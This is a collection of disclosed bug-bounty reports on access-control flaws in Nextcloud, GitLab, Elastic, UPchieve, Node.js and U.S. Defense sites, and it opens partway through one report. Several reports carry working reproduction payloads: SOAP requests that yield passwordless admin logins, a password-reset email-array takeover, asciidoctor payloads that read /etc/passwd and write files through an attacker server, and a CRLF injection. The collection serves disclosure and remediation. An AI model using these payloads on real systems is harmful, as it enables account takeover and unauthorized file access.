Content-Type: application/x-www-form-urlencoded
Accept: */*
Origin: https://admin.phacility.com
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Accept-Encoding: gzip, deflate, br
Accept-Language: id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7,cs;q=0.6
Cookie: aura=u2FOcME6PSlT; admin_phusr=amer17; admin_phsid=ld7bdwzjadvg5x3go3wykgzj3blk3qrdidlqd452; halo=9LIv4U24kVpa

__csrf__=B%402hmxctpgc672d004d5b2cc5c&__form__=1&__dialog__=1&new=true&email=asuuu17%40gmail.com&__submit__=true&__wflow__=true&__ajax__=true&__metablock__=3

Pay attention (email=), change the victim's email to the attacker email with the same token, in this case the attacker can enter his email

## Impact

The weakness of the session token, allows the attacker to add his email and reset the password via the attacker's email

---

### [Scoped apptokens can be changed by that very apptoken](https://hackerone.com/reports/1193321)

- **Report ID:** `1193321`
- **Severity:** High
- **Weakness:** Improper Access Control - Generic
- **Program:** Nextcloud
- **Reporter:** @rtod
- **Bounty:** 1000 usd
- **Disclosed:** 2021-07-15T19:10:01.824Z
- **CVE(s):** CVE-2021-32688

**Vulnerability Information:**

I noticed that there is the possibility to limit apptokens to not be able to access the filesystem.

1. Create a new apptoken in `https://server/settings/user/security`
2. Click the .. of your new apptoken and make it not allowed to access the filesystem
3. Log out
4. Navigate to `https://server/remote.php/dav` and login with your username + apptoken
5. Navigate again to `https://server/settings/user/security`
6. You won't be able to access the apptoken data
7. Obtain the CSRF token
8. Send a PUT request to `https://server/settings/personal/authtokens/ID` chaging the scope

Now the ID you do not know. However even on a decent sized system it is not hard to iterate this as there is no rate limiting or throttling at all.
And voila. You have filesystem access.

You could also remove other apptokens of the same user (if you'd want).

## Impact

Leaked scoped tokens could be used to gain full access to all your data. Defeating the whole purpose of scoped tokens.

I recommend.

1. Only allow tokens that result from a real login (so user+pass+2fa) to modify/delete tokens
2. Do not allow the current token in use to edit itself

---

### [Unauthorized access to admin panel of the Questionmark Perception system at https://██████████](https://hackerone.com/reports/1026146)

- **Report ID:** `1026146`
- **Severity:** Critical
- **Weakness:** Improper Access Control - Generic
- **Program:** U.S. Dept Of Defense
- **Reporter:** @qdoan95
- **Bounty:** - usd
- **Disclosed:** 2021-06-30T20:41:48.260Z
- **CVE(s):** -

**Vulnerability Information:**

**Summary:**
Due to the lack of access control, an anonymous attacker can compromise the administrator account on the Questionmark Perception system.

**Description:**
By using the service description which publicly accessible on the internet, and by bypassing the access control, an anonymous attacker can (ab)use the method provided by the system and get the administrator access on the Questionmark Perception system.

## Step-by-step Reproduction Instructions
- Visit https://██████/█████████ to get all the Questionmark Web Integration Services' description.
████

- The method **GetAdministratorList** returns a list giving the full details of all the administrators in the database, as described in https://███████/███?████

████████

- Issuing the request shown above, but remove all the code between the <soapenv:Header> and the </soapenv:Header> tag like the request below:

```
POST /███ HTTP/1.1
Host: ████
Content-Type: text/xml; charset=utf-8
Content-Length: 328
SOAPAction: "http://questionmark.com/QMWISe/GetAdministratorList"

<?xml version="1.0" encoding="utf-8"?>
<soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
  <soap:Body>
    <GetAdministratorList xmlns="http://questionmark.com/QMWISe/" />
  </soap:Body>
</soap:Envelope>
```
- The response shows us a list giving the full details of all the administrators in the database, included `Administrator_ID`, `Administrator_Name`, `Email`,...

█████

- The method **GetAccessAdministrator** processes an Administrator Name and returns a URL that enables the administrator to log in to Enterprise Manager (without using a password) if the administrator exists, so using the information we got above, we can (ab)use this method to get access to an administrator account.

```
POST /███████ HTTP/1.1
Host: ██████████
Content-Type: text/xml; charset=utf-8
Content-Length: 416
SOAPAction: "http://questionmark.com/QMWISe/GetAccessAdministrator"

<?xml version="1.0" encoding="utf-8"?>
<soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
  <soap:Body>
    <GetAccessAdministrator xmlns="http://questionmark.com/QMWISe/">
      <Administrator_Name>au_eliut</Administrator_Name>
    </GetAccessAdministrator>
  </soap:Body>
</soap:Envelope>
```
- The response gives us a link to login without using a password.

```
HTTP/1.1 200 OK
Cache-Control: private, max-age=0
Content-Type: text/xml; charset=utf-8
Server: 0
X-AspNet-Version: 2.0.50727
Strict-Transport-Security: max-age=63072000;includeSubDomains;preload
Date: Wed, 04 Nov 2020 18:18:46 GMT
Content-Length: 565
Set-Cookie: BIGipServer██████████████ path=/; Httponly; Secure

<?xml version="1.0" encoding="utf-8"?><soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema"><soap:Body><GetAccessAdministratorResponse xmlns="http://questionmark.com/QMWISe/"><URL>https://█████████/em5/exlogin.asp?CustomerID=AuthoringRepository&amp;USER=au_eliut&amp;EXPIRY=04:11:2020:13:18&amp;CHECKSUM=db69772f40b1a71179fd96e1bceebed003f3049e03a78e7d009c4627d387da2c</URL></GetAccessAdministratorResponse></soap:Body></soap:Envelope>

```
██████████
- Using the link above: `https://██████████/████████` to login as admin.

████████

## Suggested Mitigation/Remediation Actions
- Remove the service description at https://██████/█████████
- Re-configure the system, to deny all the request without the SOAP "Trust" header.

## Impact

Incorrect access restriction to the authorized interface of the site leads to information leakage. [As Questionmark describes,](https://support.questionmark.com/content/web-services) an admin can view all fields of the questions, the results, and personal information of the participants.

For example, issuing the request below to get all the participants' information such as username, password,...

```
POST /██████ HTTP/1.1
Host: ███████
Content-Type: text/xml; charset=utf-8
Content-Length: 326
SOAPAction: "http://questionmark.com/QMWISe/GetParticipantList"

<?xml version="1.0" encoding="utf-8"?>
<soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
  <soap:Body>
    <GetParticipantList xmlns="http://questionmark.com/QMWISe/" />
  </soap:Body>
</soap:Envelope>
```

█████

---

### [Default Admin Username and Password on █████ Server at █████████mil](https://hackerone.com/reports/1195325)

- **Report ID:** `1195325`
- **Severity:** Critical
- **Weakness:** Improper Access Control - Generic
- **Program:** U.S. Dept Of Defense
- **Reporter:** @the_boschko
- **Bounty:** - usd
- **Disclosed:** 2021-06-15T19:28:16.108Z
- **CVE(s):** -

**Vulnerability Information:**

**Description:**
A ██████ Server is running at https://███mil you can access the login at https://████mil/█████████ the application is using the default "Administrator for the default organization" credentials 

#POC 
Go to  https://███mil/████████ and login with *█████*

██████████

████

████

## How to remediate the vulnerability

Change the password of the user or disable the account 

## References
█████
https://cwe.mitre.org/data/definitions/521.html


##EXTRA

If you have any questions or concerns regarding the above let me know!

Cheers,

## Impact

A Department of Defense website was misconfigured in a manner that may have allowed a malicious user to login with administrator for the default organization account credentials.

## System Host(s)
████mil

## Affected Product(s) and Version(s)


## CVE Numbers


## Steps to Reproduce
Read the POC

## Suggested Mitigation/Remediation Actions
Change the password of the user or disable the account

---

### [Improper authorization on `/api/as/v1/credentials/` allows any App Search user to access all API keys and escalate privileges](https://hackerone.com/reports/1168528)

- **Report ID:** `1168528`
- **Severity:** High
- **Weakness:** Improper Access Control - Generic
- **Program:** Elastic
- **Reporter:** @dee-see
- **Bounty:** - usd
- **Disclosed:** 2021-06-02T17:06:49.633Z
- **CVE(s):** -

**Vulnerability Information:**

## Summary

Hello team, I hope you're doing well! App Search has a credentials page located at `/as#/credentials` that lists all the API keys a user has access to, if any. That same page will 404 for users with `Analyst` or `Editor` role. This is all working as intended, however there is also an [API endpoint](https://www.elastic.co/guide/en/app-search/current/credentials.html) to query that same data at `/api/as/v1/credentials/` and this will list all existing API keys for any authenticated user regardless of their App Search role.

## Steps to reproduce

I'm going to use the cloud environment for the reproduction

### Preparation

1. Log in App Search with the admin (`elastic`) user and go to the `Users & roles` page (`/as#/role-mappings/`)
1. Click `Add mapping`
1. In the `Attribute value` field enter `h1-repro`
1. In the `Role` box select `Analyst`
1. In the `Engine Access` select `Limited Engine Access`, no need to select any engine
    - We now have created the most limited role possible
1. Log in Kibana with the admin (`elastic`) user and go to the `Stack Management` > `Users` page (`/app/management/security/users/`)
1. Click `Create user`
1. In the `Username` field enter `hi-repro`
1. Set any password you like and then click `Create user`

### Reproduction

1. Log in App Search with the `h1-repro` user
1. Navigate to `/as#/role-mappings/` and observe that it's a 404 because you don't have access to this page
1. Navigate to `/api/as/v1/credentials/` and observe that you have access to all the API keys

## Impact

Privilege escalation. The default App Search install has a [Private API Key with read/write access to all engines](https://www.elastic.co/guide/en/app-search/current/authentication.html#authentication-key-types). If a Private Admin Key has been created before. the attacker can use it to create new API keys or delete existing ones.

---

### [Kroki Arbitrary File Read/Write ](https://hackerone.com/reports/1098793)

- **Report ID:** `1098793`
- **Severity:** High
- **Weakness:** Improper Access Control - Generic
- **Program:** GitLab
- **Reporter:** @ledz1996
- **Bounty:** - usd
- **Disclosed:** 2021-05-21T19:56:02.582Z
- **CVE(s):** -

**Vulnerability Information:**

### Summary

In short, I've found a potentially weird bug in `asciidoctor` that could lead to arbitrary file read/write in `asciidoctor-kroki` even though Gitlab have already made an attempt to disable `kroki-plantuml-include`

**lib/gitlab/asciidoc.rb**
```rb
module Gitlab
  # Parser/renderer for the AsciiDoc format that uses Asciidoctor and filters
  # the resulting HTML through HTML pipeline filters.
  module Asciidoc
    MAX_INCLUDE_DEPTH = 5
    MAX_INCLUDES = 32
    DEFAULT_ADOC_ATTRS = {
        'showtitle' => true,
        'sectanchors' => true,
        'idprefix' => 'user-content-',
        'idseparator' => '-',
        'env' => 'gitlab',
        'env-gitlab' => '',
        'source-highlighter' => 'gitlab-html-pipeline',
        'icons' => 'font',
        'outfilesuffix' => '.adoc',
        'max-include-depth' => MAX_INCLUDE_DEPTH,
        # This feature is disabled because it relies on File#read to read the file.
        # If we want to enable this feature we will need to provide a "GitLab compatible" implementation.
        # This attribute is typically used to share common config (skinparam...) across all PlantUML diagrams.
        # The value can be a path or a URL.
        'kroki-plantuml-include!' => '',
        # This feature is disabled because it relies on the local file system to save diagrams retrieved from the Kroki server.
        'kroki-fetch-diagram!' => ''
```

However this could easily be bypassed by using `counter`

https://github.com/asciidoctor/asciidoctor/blob/master/lib/asciidoctor/document.rb
```rb
  def counter name, seed = nil
    return @parent_document.counter name, seed if @parent_document
    if (attr_seed = !(attr_val = @attributes[name]).nil_or_empty?) && (@counters.key? name)
      @attributes[name] = @counters[name] = Helpers.nextval attr_val
    elsif seed
      @attributes[name] = @counters[name] = seed == seed.to_i.to_s ? seed.to_i : seed
    else
      @attributes[name] = @counters[name] = Helpers.nextval attr_seed ? attr_val : 0
    end
  end
```


### Steps to reproduce


1. Set up Gitlab with Kroki: https://docs.gitlab.com/ee/administration/integration/kroki.html
**Arbitrary FIle Read**
2. Create a project, create a wiki page with `asciidoctor` format and the following as payload

```asciidoctor
[#goals]

[plantuml, test="{counter:kroki-plantuml-include:/etc/passwd}", format="png"]
....
class BlockProcessor
class DiagramBlock
class DitaaBlock
class PlantUmlBlock

BlockProcessor <|-- {counter:kroki-plantuml-include}
DiagramBlock <|-- DitaaBlock
DiagramBlock <|-- PlantUmlBlock
....
```

3. Get the base64 part of the URL of the image when being rendered
4. Use the following code to decode the last part of the URL to get the content of file `/etc/passwd`

```rb
require 'base64'
require 'zlib'


test = "eNpLzkksLlZwyslPzg4oyk9OLS7OL-JKBgu6ZCamFyXmguXgQiWJicgCATmJeSWhuTkQMS5UcxRsanR1FTJSM1K5kM2CCCMZhSmJYiwAy8U5sQ=="
p Zlib::Inflate.inflate(Base64.urlsafe_decode64(test))
```

Video:

{F1188648}

**Arbitrary FIle Write**
1. Create a project, create a wiki page with `asciidoctor` format and the following as payload

```asciidoctor
[#goals]
:imagesdir: .
:outdir: /tmp/

[plantuml]
....
class BlockProcessor
class DiagramBlock
class DitaaBlock
class PlantUmlBlock

BlockProcessor <|-- hehe
DiagramBlock <|-- DitaaBlock
DiagramBlock <|-- PlantUmlBlock
....
```

2. Note in the URL there is a base64 value, copy this value

3. Set up a server with the address that is being appended as `kroki-server-url,`, I used this scriptto serve a public-key file with any URL.


```python
/// python3 this_script.py <port>
from http.server import BaseHTTPRequestHandler, HTTPServer
import logging

class S(BaseHTTPRequestHandler):
    def _set_response(self):
        self.send_response(200)
        self.send_header('Content-type', 'text/html')
        self.end_headers()

    def do_GET(self):
        logging.info("GET request,\nPath: %s\nHeaders:\n%s\n", str(self.path), str(self.headers))
        self._set_response()
        self.wfile.write(b"ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDEY+UcYlP8VzOBdyMGUpbVFMsAUxPjWK7OiqARu/t3wO1mSNJ/RE5eaNLz5+6zM2WllUVrYF3cDXqNxge4srScM/v887Lz8mAupAZoPunxHrSTWFHjbCBaGm80z8QyStG+GMM/iN+mu4FtQ+ckMfOA8T/9k3clK3HomQXunJe85a6MPDsgE5MvEm4MdBUKQpEaEbstmAWtQIR5KCMHyNDa9WVKQQI+TJwAMpVa3L+Lbx4TZd04Fl5uKmCYUfPfBvj1/209s1XDN2rAK3AKJjAEbPVuLcZrl9iAse0FgA6HvUtA+g21VLba5OASXU/ZsedRmzECefMu8RVKHPzaaiC+RQU+1ihgBnQig0MdaXz8PZLOCo/673Pg9nsqjNafeU7fGTJD95BkkDL/3OfIEBq+rMbOyxrU+k8H+QWeVCbvh2LWRxdy/xciOMkkdodm2eGg45kJNjoDeKJEp0YpQ9ha+PdsqQqENAbqFqmYheAy1KJcpbG+U6Uik4hVXHxTAu0= ledz@ledzs-MacBook-Pro.local")

    def do_POST(self):
        content_length = int(self.headers['Content-Length']) # <--- Gets the size of data
        post_data = self.rfile.read(content_length) # <--- Gets the data itself
        logging.info("POST request,\nPath: %s\nHeaders:\n%s\n\nBody:\n%s\n",
                str(self.path), str(self.headers), post_data.decode('utf-8'))

        self._set_response()
        self.wfile.write("POST request for {}".format(self.path).encode('utf-8'))

def run(server_class=HTTPServer, handler_class=S, port=8080):
    logging.basicConfig(level=logging.INFO)
    server_address = ('0.0.0.0', port)
    httpd = server_class(server_address, handler_class)
    logging.info('Starting httpd...\n')
    try:
        httpd.serve_forever()
    except KeyboardInterrupt:
        pass
    httpd.server_close()
    logging.info('Stopping httpd...\n')

if __name__ == '__main__':
    from sys import argv

    if len(argv) == 2:
        run(port=int(argv[1]))
    else:
        run()
```

4. Note the URL and edit the following script to create a SHA256 of the URL

```rb
require 'digest'
require 'base64'
require 'zlib'

string = "http://192.168.69.1:8082/plantuml/../../../../../../tmp/test_file_write.txt/eNpLzkksLlZwyslPzg4oyk9OLS7OL-JKBgu6ZCamFyXmguXgQiWJicgCATmJeSWhuTkQMS5UcxRsanR1FTJSM1K5kM2CCCMZhSmJYiwAy8U5sQ=="

p "diag-#{Digest::SHA256.hexdigest test = string}"
```

4. Create a project, create a wiki page with `asciidoctor` format and the following as payload for the first time, replace the `diag-**.` with the `diag-<output_previous>.`, Please take note of the last `.`

```
[#goals]
:imagesdir: diag-58f90331904a1989259d639c5677e0fff5e434e739c70f1d3bb2004723bc99b8.
:outdir: /tmp/

[plantuml, test="{counter:kroki-fetch-diagram:true}",tet="{counter:kroki-server-url:http://192.168.69.1:8082/}", format="/../../../../../../tmp/test_file_write.txt"]
....
class BlockProcessor
class DiagramBlock
class DitaaBlock
class PlantUmlBlock

BlockProcessor <|-- hehe
DiagramBlock <|-- DitaaBlock
DiagramBlock <|-- PlantUmlBlock
....
```

Save then render

5. Repeat the previous step with this payload

```
[#goals]
:imagesdir: diag-58f90331904a1989259d639c5677e0fff5e434e739c70f1d3bb2004723bc99b8.
:outdir: /tmp/

[plantuml, test="{counter:kroki-fetch-diagram:true}",tet="{counter:kroki-server-url:http://192.168.69.1:8082/}", format="/../../../../../../tmp/test_file_write.txt"]
....
class BlockProcessor
class DiagramBlock
class DitaaBlock
class PlantUmlBlock

BlockProcessor <|-- hehe
DiagramBlock <|-- DitaaBlock
DiagramBlock <|-- PlantUmlBlock
```

Save then render again

5. You are able to write to any files. You can check this by simply navigate to the file using the Gitlab box

Video:

{F1188695}


#### Results of GitLab environment info

```
System information
System:     Ubuntu 16.04
Proxy:      no
Current User:   git
Using RVM:  no
Ruby Version:   2.7.2p137
Gem Version:    3.1.4
Bundler Version:2.1.4
Rake Version:   13.0.1
Redis Version:  5.0.9
Git Version:    2.29.0
Sidekiq Version:5.2.9
Go Version: unknown

GitLab information
Version:    13.7.4-ee
Revision:   368b4fb2eee
Directory:  /opt/gitlab/embedded/service/gitlab-rails
DB Adapter: PostgreSQL
DB Version: 11.9
URL:        http://gitlab3.example.vm
HTTP Clone URL: http://gitlab3.example.vm/some-group/some-project.git
SSH Clone URL:  git@gitlab3.example.vm:some-group/some-project.git
Elasticsearch:  no
Geo:        yes
Geo node:   Primary
Using LDAP: no
Using Omniauth: yes
Omniauth Providers:

GitLab Shell
Version:    13.14.0
Repository storage paths:
- default:  /var/opt/gitlab/git-data/repositories
GitLab Shell path:      /opt/gitlab/embedded/service/gitlab-shell
Git:        /opt/gitlab/embedded/bin/git
```

## Impact

File read/write access, RCE

---

### [Improper Access Control on Lark Footer Feature](https://hackerone.com/reports/1169340)

- **Report ID:** `1169340`
- **Severity:** High
- **Weakness:** Improper Access Control - Generic
- **Program:** Lark Technologies
- **Reporter:** @imran_nisar
- **Bounty:** - usd
- **Disclosed:** 2021-05-18T21:42:30.979Z
- **CVE(s):** -

**Summary (team):**

Due to improper access control within Lark's footer feature, an attacker could have potentially accessed private files. We thank @imran_nisar for reporting this to our team and confirming the resolution.

---

### [No Valid SPF Records/don't have DMARC record](https://hackerone.com/reports/1198439)

- **Report ID:** `1198439`
- **Severity:** Critical
- **Weakness:** Improper Access Control - Generic
- **Program:** UPchieve
- **Reporter:** @recreati
- **Bounty:** - usd
- **Disclosed:** 2021-05-18T18:49:59.228Z
- **CVE(s):** -

**Vulnerability Information:**

I have already reported this isssue through email and the company has accepted my report.
Hiii,
There is any issue No valid SPF Records on 
https://app.upchieve.org
Desciprition :
There is a email spoofing vulnerability.Email spoofing is the forgery of an email header so that the message appears to have originated from someone or somewhere other than the actual source. Email spoofing is a tactic used in phishing and spam campaigns because people are more likely to open an email when they think it has been sent by a legitimate source. The goal of email spoofing is to get recipients to open, and possibly even respond to, a solicitation.
I found :
SPF record lookup and validation for: https://app.upchieve.org
SPF records are published in DNS as TXT records.
The TXT records found for your domain are:
No valid SPF record found.
Use the back button on your browser to return to the SPF checking tool without clearing the form.
Remediation :
Replace ~all with -all to prevent fake email.
ss attched with this
you can check this using https://www.kitterman.com/spf/validate.html
if you had a valid spf record then you don't have DMARC record due to which any one can send the mail on behalf of comapny which cause same issues of damaging comapny reputation can be used to get user data.
for checking this visit : https://dmarcian.com/spf-survey/
and type your url and you'll find all the details i
i send you the screen shot as a proof of both the above.

## Impact

An attacker would send a Fake email. can also use to get user credential after send a psihing link through mail.The results can be more dangerous.

---

### [Zero click account Takeover due to Api misconfiguration 🏂🎩](https://hackerone.com/reports/1166500)

- **Report ID:** `1166500`
- **Severity:** Critical
- **Weakness:** Improper Access Control - Generic
- **Program:** UPchieve
- **Reporter:** @zero_or_1
- **Bounty:** - usd
- **Disclosed:** 2021-05-14T21:36:20.685Z
- **CVE(s):** -

**Summary (team):**

Hacker reported that full account takeover was possible through exploitation of one our forms. Hacker provided sufficient information to prove capability and how to remediate. Our team remediated the issue so that the takeover is no longer possible.

**Summary (researcher):**

i was able to take over any account without any action from the user

---

### [Full account takeover of any user through reset password](https://hackerone.com/reports/1175081)

- **Report ID:** `1175081`
- **Severity:** Critical
- **Weakness:** Improper Access Control - Generic
- **Program:** UPchieve
- **Reporter:** @saajanbhujel
- **Bounty:** - usd
- **Disclosed:** 2021-05-14T21:28:47.200Z
- **CVE(s):** -

**Vulnerability Information:**

## Summary:
Hi Security team members,

Usually, If we reset our password on https://app.upchieve.org that time we got a password reset link on the email. And through that password reset link, we can reset our password.

But, I noticed that if we add another email in the request of forgot password through Burpsuite then both person will get the same password reset token in their email. So, an attacker can takeover any account without the user's interaction.

## Steps To Reproduce:
1. Navigate to: https://app.upchieve.org/resetpassword 

2. Then, enter the victim's email address 

3. Intercept this request

4. Now, add your email also in the JSON body. like this:
```
{"email":["victim@gmail.com","your@gmail.com"]}
```
5. Forward this request

6. Now victim and you will receive the same password reset link
{F1278871}

7. By using that link which you just received in your email

8.  You can fully takeover the victim's account by reset password.

##POC:
{F1278872}

## Impact

1. It is a critical issue because an attacker can change any user's password without any user interaction.
2. This attack does not require any interaction from the victim to perform any actions and yet the account can be taken over by the attacker.
3. An attacker can fully takeover any user's account

---

### [bypassing dashboard without account + Information disclosure trough websockets ](https://hackerone.com/reports/1102780)

- **Report ID:** `1102780`
- **Severity:** High
- **Weakness:** Improper Access Control - Generic
- **Program:** Nextcloud
- **Reporter:** @deb0con
- **Bounty:** - usd
- **Disclosed:** 2021-04-20T13:57:04.868Z
- **CVE(s):** -

**Vulnerability Information:**

**Sumarry :** 
I found a information disclosure for bypassing parameter url attacker can redirect to dashboard without login user/pass page
and websocket can be exposed in response/dashboard.

**URL Effected**
https://support.nextcloud.com/#password_reset

### Steps To Reproduce:
  * Opened directory at https://support.nextcloud.com/#password_reset
  * Forget-password  and repeat url to burp-suite
  * In directory added a parameter bypass is ``//%0d%0aSet-Cookie:%20crlf-injection=mickeybrew//``
  * and look a responsive , you can be redirect to dashboard panel without user/pass
  * Show the ``network-browser`` and you can found api directory and websocket
  * Directory websocket is https://support.nextcloud.com/api/v1/signshow
  * Opened it and **Boom** You can see Information disclosure through websocket

**Request**
```
GET #password_reset/%0d%0aSet-Cookie:%20crlf-injection=mickey HTTP/1.1
Host: support.nextcloud.com
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
Content-Length: 91
```
 ### Screenshots POC
█████
██████
███████
███

## Impact

It may cause the attacker to log into the dashboard page without logging in via user/pass, and the attacker finds sensitive files on open fires.

---

### [Improper Access Control - Generic on https://████](https://hackerone.com/reports/992618)

- **Report ID:** `992618`
- **Severity:** High
- **Weakness:** Improper Access Control - Generic
- **Program:** U.S. Dept Of Defense
- **Reporter:** @fiveguyslover
- **Bounty:** - usd
- **Disclosed:** 2021-04-02T18:45:51.034Z
- **CVE(s):** -

**Vulnerability Information:**

Greetings, I found on one of your sub-domains some tickets that are not supposed to be readable by everyone, we even have the possibility to delete the tickets.
Link : 
https://███/█████/latest
https://█████/███████/all
https://█████/███████ (DELETE HEADER METHOD)

Best regards,
frenchvlad

## Impact

a malicious person can delete tickets and see the progress of tickets in progress

**Summary (researcher):**

Title : Uncontrolled access to a sensitive U.S. Department of Defense dashboard.
Weakness : Improper Access Control - Generic
Severity : High
Reported at : September 28, 2020 3:31am +0200

---

### [param allows  any external resource to be downloadable | https://████████](https://hackerone.com/reports/995347)

- **Report ID:** `995347`
- **Severity:** High
- **Weakness:** Improper Access Control - Generic
- **Program:** U.S. Dept Of Defense
- **Reporter:** @x3ph_
- **Bounty:** - usd
- **Disclosed:** 2021-03-11T20:59:16.737Z
- **CVE(s):** -

**Vulnerability Information:**

**Description:**
The following param allows an attacker to trick people into downloading malicious files, scripts and other payloads.

https://██████████?url=https://<MaliciousURL>

PoC

1. I will show you how the page looks normally without any changes. If you directly access https://███ you will be shown the following page. You can click on 'Click to download' but nothing happens.

█████

2. I replace the download param with the url param and entered my attacking vps server ip address as the URL and execute.

█████

3. On my attacking vps server (The black console) you can see that i have received the request from my personal computers ip address showing that it is 100% possible to perform this attack.

https://██████████?url=https://████/poc

████████

## Impact
If an attacker abuses this vulnerability he/she will be able to compromise accounts, computers and identities of people. Potentially Military staff if the attacker had bad intentions.

## Step-by-step Reproduction Instructions

1. Navigate to https://███████
2. Click on 'Click to download'
3. Replace download with url
4. Type in a url and click download

## Product, Version, and Configuration (If applicable)

## Suggested Mitigation/Remediation Actions
Dev needs to add validation to the url param so that it doesn't allow external resources to be downloadable.

Resources:

The only article i can find pertaining to this type of vulnerability

https://cheatsheetseries.owasp.org/cheatsheets/Unvalidated_Redirects_and_Forwards_Cheat_Sheet.html

## Impact

If an attacker abuses this vulnerability he/she will be able to compromise accounts, computers and identities of people. Potentially Military staff if the attacker had bad intentions.

---

### [Acting under any different user via DB-stored credentials](https://hackerone.com/reports/1061591)

- **Report ID:** `1061591`
- **Severity:** High
- **Weakness:** Improper Access Control - Generic
- **Program:** Nextcloud
- **Reporter:** @alexanderhofstaetter
- **Bounty:** - usd
- **Disclosed:** 2021-03-01T11:02:24.045Z
- **CVE(s):** CVE-2021-22877

**Vulnerability Information:**

The issue is related to all Nextcloud versions. It is not patched yet. All versions (18-20) seems to be vulnerable. The issue came up in the following environment:

- nextcloud docker image (20.0.2 and 20.0.3)
- LDAP authentication
- external SMB shares via DB stored credentials

The problem came up after several users could not access their mounted SMB shares. When I checked, what was going on, it seems that DB credentials are getting stored from the session (table `oc_storages_credentials`) to the DB. The problem is, that there is no check if the current user in the session is the same as the user for whom the credentials get stored.

It seems that the credentials saved in the corresponding table (`oc_storages_credentials`) are wrong and therefore all SMB shares are showing errors.

When I initially add the external storage SMB mounts in the settings and then a user logs in the first time, the SMB shares work (with the correct login) which gets correctly saved in the DB.

Afterwards I can find one single entry on the `oc_storages_credentials`-table

However, when I (as an admin) navigate to: `https://cloud.example.org/settings/users` the table `oc_storages_credentials` gets (pre)populated with all the users (and some random credentials) - this also includes all users who weren´t logged-in yet. When the user logs in afterwards the credentials entry is already there and does not get updated.

### Steps to reproduce
1. Add external SMB mount with option "credentials saved in database"
2. Manually check the MYSQL table `oc_storages_credentials` - it should be empty
3. As an admin: navigate to (`/settings/users`) 
4. Recheck the MYSQL table `oc_storages_credentials` - there is an entry for every user now
5. The stored credentials in the DB are now the admin credentials
6. user can act as the admin user (their LDAP / AD password is stored in `oc_storages_credentials` for every user

### Expected behaviour
1. Do not populate the table `oc_storages_credentials` on "user list settings page"
2. If the current user credentials does not match the ones in the DB -> update it

### Actual behaviour
- `password::logincredentials/credentials` entries are getting deployed initially from the admin user ...

### Bugfix / Patch

There should be two files affected:
- `/apps/files_external/lib/Lib/Auth/Password/LoginCredentials.php`
- `/apps/files_external/lib/Listener/StorePasswordListener.php`


It looks like there is a form of wrong impersonation going on here. -> The git-Diff for a security conform bugfix is attached.

### Server configuration

I am using this docker image (no modifications): https://github.com/nextcloud/docker/tree/master/.examples/dockerfiles/full/fpm-alpine

**Operating system:** Docker on Ubuntu 20.04.1 LTS
**Web server:** nginx with php-fpm
**Database:** mariadb 10.5 as docker container
**PHP version:** 7php .4
**Nextcloud version:** 20.0.2
**Updated from an older Nextcloud/ownCloud or fresh install:** updated from nextcloud 18.0.11 -> 19.0 -> 20.0.3
**Where did you install Nextcloud from:**

## Impact

- Acting as a different user (as admin credentials are stored for every user in the DB)
- get a normal user account and accessing SMB shares on the network with higher privileges as himself
- getting access to internal ressources via external shared links

---

### [DNS rebinding in --inspect (insufficient fix of CVE-2018-7160)](https://hackerone.com/reports/1069487)

- **Report ID:** `1069487`
- **Severity:** High
- **Weakness:** Improper Access Control - Generic
- **Program:** Node.js
- **Reporter:** @v6ak
- **Bounty:** 500 usd
- **Disclosed:** 2021-02-23T16:35:51.348Z
- **CVE(s):** CVE-2021-22884, CVE-2018-7160

**Vulnerability Information:**

**Summary:** While the debugger (i.e., the --inspect option) tries to prevent DNS rebinding, the whitelist is excessive.

**Description:** The whitelist includes “localhost6”, which is not that widespread.  When “localhost6” is not present in /etc/hosts, it is just an ordinary domain that is resolved via DNS, i.e., over network. If the attacker controls victim's DNS server or can spoof its responses, the DNS rebinding protection can be bypassed by using the “localhost6” domain. As long as the attacker uses the “localhost6” domain, they can still apply the attack described in CVE-2018-7160.

Reasoning why localhost6 is not so common and Node.js should not rely on its presence in the hosts file:

* It is not even present in the node:latest Docker image (sha256:aa1930b56896a43dedb227526d5d40f4a6e9157f9d8703f9584650cde510438a)
* I haven't seen it in Windows 10.
* Unlike RFC 6761 for localhost, I have found no RFC that mentions localhost6 (see https://www.google.com/search?q=localhost6+site%3Atools.ietf.org ).

## Steps To Reproduce:

Preconditions: Victim has no entry for localhost6 in hosts and attacker controls DNS responses. (It does not matter if the attacker control the DNS server or the network communication between the DNS server and the victim.)

  1. Victim runs node with --inspect option
  2. Victim visits attacker's webpage
  3. The attacker's webpage opens http://localhost6:9229
  4. Victim finds no “localhost6” entry in hosts file, so it asks the DNS server and gets <attacker's-IP>. (Maybe the response will have a short TTL. There are multiple tricks to make DNS rebinding successful in a short time, but I am not going to be exhaustive.)
  5. Victim loads webpage http://localhost6:9229 from <attacker's-IP>.
  6. The webpage http://localhost6:9229 tries to load http://localhost6:9229/json from attacker's server. (If the IP address of “localhost6” is still cached, attacker needs to retry. There are techniques that can speed it up, like using RST packet.)
  7. Due to a short TTL, the DNS server will be soon asked again about an entry for “localhost6”. This time, the DNS server responds “127.0.0.1”.
  8. The http://localhost6:9229 website (i.e., the one hosted on <attacker's IP>) will retrieve http://localhost6:9229/json from 127.0.0.1, including webSocketDebuggerUrl.
  9. Now, the attacker knows the webSocketDebuggerUrl and can connect to is using WebSocket. Note that WebSocket is not restricted by same-origin-policy. By doing so, they can gain the privileges of the Node.js instance.

Vulnerable code: https://github.com/nodejs/node/blob/fdf0a84e826d3a9ec0ce6f5a3f5adc967fe99408/src/inspector_socket.cc#L584

## Impact:

Attacker can gain access to the Node.js debugger, which can result in remote code execution.

